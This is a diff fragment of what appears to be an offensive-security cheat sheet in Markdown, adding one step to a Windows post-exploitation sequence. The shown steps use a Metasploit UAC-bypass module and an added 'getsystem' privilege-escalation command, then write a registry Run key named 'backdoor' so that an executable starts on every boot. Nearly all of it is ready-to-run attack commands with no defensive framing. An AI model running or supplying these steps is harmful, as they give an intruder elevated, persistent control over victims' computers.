@@ -366,6 +366,7 @@ x Personal Monitor is used for remote monitoring on a computer that includes rec
 2. for bypass uac use this module 
 	- ``use exploit/windows/local/bypassuac_silentcleanup ``
 3. get elevate privileges
+	- ``getsystem -t 1``
 4. open shell and type 
 	- ``reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"`` `#filename.exe`
 
